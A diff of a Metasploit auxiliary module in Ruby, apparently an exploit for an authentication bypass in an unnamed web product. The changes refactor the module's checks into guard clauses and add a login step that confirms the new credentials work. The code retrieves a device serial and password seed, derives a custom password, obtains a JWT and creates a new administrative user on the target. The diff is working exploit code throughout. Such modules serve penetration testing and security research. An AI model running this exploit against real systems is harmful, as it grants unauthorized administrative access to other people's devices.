@@ -72,19 +72,19 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    if res.code == 200
-      json = res.get_json_document
-      if json.key?('passwordRandom') && json.key?('serial')
-        password_random = json['passwordRandom']
-        serial = json['serial']
-        print_good('Retrieved passwordRandom: ' + password_random)
-        print_good('Retrieved serial: ' + serial)
-      else
-        fail_with(Failure::UnexpectedReply, 'Unable to retrieve passwordRandom and serial')
-      end
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, res.to_s)
     end
+
+    json = res.get_json_document
+    unless json.key?('passwordRandom') && json.key?('serial')
+      fail_with(Failure::UnexpectedReply, 'Unable to retrieve passwordRandom and serial')
+    end
+
+    password_random = json['passwordRandom']
+    serial = json['serial']
+    print_good('Retrieved passwordRandom: ' + password_random)
+    print_good('Retrieved serial: ' + serial)
 
     # 2) Create passwordCustom
     sha1_hash = Digest::SHA1.hexdigest(serial)
@@ -107,24 +107,26 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    if res.code == 200
-      json = res.get_json_document
-      if json.key?('accessToken')
-        access_token = json['accessToken']
-        print_good('Retrieved JWT: ' + access_token)
-      else
-        fail_with(Failure::UnexpectedReply, 'Did not receive JWT')
-      end
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, res.to_s)
     end
 
+    json = res.get_json_document
+    unless json.key?('accessToken')
+      fail_with(Failure::UnexpectedReply, 'Did not receive JWT')
+    end
+
+    access_token = json['accessToken']
+    print_good('Retrieved JWT: ' + access_token)
+
     # 4) Add a new administrative user
-    body = '{"idType": "1", ' \
-    "\"name\": \"#{datastore['NEW_USER']}\", " \
-    "\"user\": \"#{datastore['NEW_USER']}\", " \
-    "\"newPassword\": \"#{datastore['NEW_PASSWORD']}\", " \
-    "\"password_confirmation\": \"#{datastore['NEW_PASSWORD']}\"}"
+    body = {
+      idType: '1',
+      name: datastore['NEW_USER'],
+      user: datastore['NEW_USER'],
+      newPassword: datastore['NEW_PASSWORD'],
+      password_confirmation: datastore['NEW_PASSWORD']
+    }.to_json
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -140,17 +142,44 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    if res.code == 200
-      json = res.get_json_document
-      if json.key?('code') && json['code'] == 200 && json.key?('error') && json['error'] == 'OK'
-        store_valid_credential(user: datastore['NEW_USER'], private: datastore['NEW_PASSWORD'], proof: json)
-        print_good("New user '#{datastore['NEW_USER']}:#{datastore['NEW_PASSWORD']}' was successfully added.")
-        print_good("Login at: https://#{datastore['RHOSTS']}:#{datastore['RPORT']}/#/login")
-      else
-        fail_with(Failure::UnexpectedReply, 'Received unexpected value for code and/or error:\n' + json.to_s)
-      end
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, res.to_s)
     end
+
+    json = res.get_json_document
+    unless json.key?('code') && json['code'] == 200 && json.key?('error') && json['error'] == 'OK'
+      fail_with(Failure::UnexpectedReply, 'Received unexpected value for code and/or error:\n' + json.to_s)
+    end
+
+    # 5) Confirm credentials work
+    body = {
+      username: datastore['NEW_USER'],
+      password: datastore['NEW_PASSWORD'],
+      passwordCustom: nil
+    }.to_json
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'ctype' => 'application/json',
+      'uri' => normalize_uri(target_uri.path, 'api/login/'),
+      'data' => body
+    })
+
+    unless res
+      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
+    end
+
+    unless res.code == 200
+      fail_with(Failure::UnexpectedReply, res.to_s)
+    end
+
+    json = res.get_json_document
+    unless json.key?('accessToken') && json.key?('unlock')
+      fail_with(Failure::UnexpectedReply, 'Received unexpected reply:\n' + json.to_s)
+    end
+
+    store_valid_credential(user: datastore['NEW_USER'], private: datastore['NEW_PASSWORD'], proof: json.to_s)
+    print_good("New user '#{datastore['NEW_USER']}:#{datastore['NEW_PASSWORD']}' was successfully added.")
+    print_good("Login at: #{full_uri(normalize_uri(target_uri, '#/login'))}")
   end
 end
